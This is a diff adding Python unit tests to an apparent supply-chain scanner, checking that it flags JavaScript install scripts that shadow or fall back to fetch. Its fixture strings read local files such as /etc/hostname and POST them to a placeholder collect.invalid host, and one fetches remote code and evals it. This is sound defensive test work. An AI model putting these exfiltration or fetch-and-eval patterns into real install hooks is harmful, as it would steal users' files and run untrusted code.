@@ -456,5 +456,94 @@ class InstallTimeTests(unittest.TestCase):
         self.assertNotIn(reason, core.install_script_risk(own))     # an installer's own shortcut
 
 
+class FetchFallbackTests(unittest.TestCase):
+    """D-21 (0.1.9): the platform's fetch, and a helper's fallback to it from a parameter (`customFetch ?? fetch`,
+    inspect-ai's view bundle), were found by name to be any function of the script's called `fetch` too (a class's
+    method), so on the tree the call returned what it was given: a route under a system folder (`/data/…`) was a
+    path, and a reader given the response read a file outside the package. Reworked after an independent review: the
+    local fallback/write/class checks do not exclude startup replacements. The old reading therefore stays,
+    including a lone file and the unused Store twin. Twin of exfiltration.test.js's."""
+
+    STORE = "class Store { fetch(k) { return k; } }\n"
+    SENT = "reads files outside the package and sends them over the network ({})"
+    TOP = "const fs = require('fs');\nconst https = require('https');\n"
+    SEND = "  https.request('https://collect.invalid/c', { method: 'POST' }).end(v);\n"
+
+    def helper(self, sig, pick, defs="", call="get('/data/list')"):
+        return ("const https = require('https');\n" + defs + f"async function get(u, {sig}) {{\n  const fetchFn = {pick};\n"
+                "  const r = await fetchFn(u);\n  return r.text();\n}\n"
+                f"async function go(reader) {{\n  const body = await {call};\n"
+                "  const v = await reader.readFile(body);\n" + self.SEND + "}\ngo(globalThis.zip);\n")
+
+    def test_a_lone_file_keeps_unknown_startup_reading(self):
+        for sig, pick in (("c", "fetch"), ("customFetch", "customFetch ?? fetch"), ("customFetch", "customFetch || fetch"),
+                          ("opts = {}", "opts.fetch ?? globalThis.fetch"), ("{ customFetch } = {}", "customFetch ?? fetch")):
+            with self.subTest(pick):
+                self.assertEqual(core.install_script_risk(self.helper(sig, pick, self.STORE), lang="js"), [self.SENT.format("/data/list")])
+
+    def test_startup_replacements_keep_project_hook_critical(self):
+        import json
+        import tempfile
+        from pathlib import Path
+        text = self.helper("customFetch", "customFetch ?? fetch", self.STORE).replace(
+            "go(globalThis.zip)", "go(require('fs').promises)")
+        for mode, command in (("preload", "node -r ./shim.js install.js"),
+                              ("node_options", 'NODE_OPTIONS="--require ./shim.js" node install.js'),
+                              ("earlier", "node -r ./bootstrap.js install.js"),
+                              ("other_file", "node install.js"), ("unknown", "node install.js")):
+            with self.subTest(mode=mode), tempfile.TemporaryDirectory() as tmp:
+                root = Path(tmp)
+                (root / "package.json").write_text(json.dumps({
+                    "name": "inert-review-fixture", "version": "1.0.0",
+                    "scripts": {"postinstall": command}}), encoding="utf-8")
+                (root / "shim.js").write_text("globalThis.fetch = async k => ({text: async () => k});\n", encoding="utf-8")
+                (root / "bootstrap.js").write_text("require('./shim.js');\n", encoding="utf-8")
+                (root / "install.js").write_text(("require('./shim.js');\n" if mode == "other_file" else "") + text, encoding="utf-8")
+                hooks = [i for i in core.scan_project(tmp)["issues"] if i["rule"] == "SC-INSTALL-HOOK"]
+                self.assertTrue(hooks)
+                self.assertEqual({i["sev"] for i in hooks}, {"CRITICAL"})
+                self.assertTrue(any("/data/list" in i["msg"] for i in hooks))
+
+    def test_a_fetch_the_code_puts_on_the_global_object(self):
+        # (the review's HIGH-1: a shim the code installs is what the call reaches)
+        for install in ("globalThis.fetch = (p) => fs.readFileSync(p, 'utf8');\n",
+                        "window.fetch = function (p) { return fs.readFileSync(p, 'utf8'); };\n",
+                        "global.fetch = (p) => fs.readFileSync(p, 'utf8');\n",
+                        "self.fetch = (p) => fs.readFileSync(p, 'utf8');\n",
+                        "Object.assign(globalThis, { fetch: (p) => fs.readFileSync(p, 'utf8') });\n",
+                        "Object.defineProperty(globalThis, 'fetch', { value: function fetch(p) { return fs.readFileSync(p, 'utf8'); } });\n"):
+            text = self.TOP + install + "function go() {\n  const v = fetch('/etc/hostname');\n" + self.SEND + "}\ngo();\n"
+            with self.subTest(install):
+                self.assertEqual(core.install_script_risk(text, lang="js"), [self.SENT.format("/etc/hostname")])
+        fallback = self.helper("customFetch", "customFetch ?? fetch", self.STORE + "globalThis.fetch = (k) => k;\n")
+        self.assertEqual(core.install_script_risk(fallback, lang="js"), [self.SENT.format("/data/list")])
+
+    def test_an_options_object_of_the_codes_own(self):
+        # (the review's HIGH-2: a class instance, a class's static method, a member defined, an object of entries)
+        for defs, call in (("class Src { fetch(k) { return k; } }\n", "get('/data/list', new Src())"),
+                           ("class Src { static fetch(k) { return k; } }\n", "get('/data/list', Src)"),
+                           ("const d = {};\nObject.defineProperty(d, 'fetch', { value: function fetch(k) { return k; } });\n",
+                            "get('/data/list', d)"),
+                           ("const mine = function fetch(k) { return k; };\n", "get('/data/list', Object.fromEntries([['fetch', mine]]))"),
+                           ("", "get('/data/list', { fetch: (k) => k })")):
+            with self.subTest(call):
+                self.assertEqual(core.install_script_risk(self.helper("opts", "opts.fetch ?? globalThis.fetch", defs, call), lang="js"),
+                                 [self.SENT.format("/data/list")])
+
+    def test_unproven_readings_stand(self):
+        # a call gives the parameter a function, or Store is instantiated: what the parameter or the global holds is
+        # not proven, so the reading by name stands, as 01f8e6b read it (here through Store's method)
+        for defs, call in (("function readList(k) { return k; }\n", "get('/data/list', readList)"),
+                           ("const s = new Store();\n", "get('/data/list')")):
+            with self.subTest(call):
+                text = self.helper("customFetch", "customFetch ?? fetch", self.STORE + defs, call)
+                self.assertEqual(core.install_script_risk(text, lang="js"), [self.SENT.format("/data/list")])
+
+    def test_what_the_fallback_receives_is_received(self):
+        text = (self.STORE + "function load(customFetch) {\n  const fetchFn = customFetch ?? fetch;\n"
+                "  return fetchFn('https://files.invalid/p').then((r) => r.text()).then((t) => eval(t));\n}\nload();\n")
+        self.assertIn("runs code it receives over the network", core.install_script_risk(text, lang="js"))
+
+
 if __name__ == "__main__":
     unittest.main()
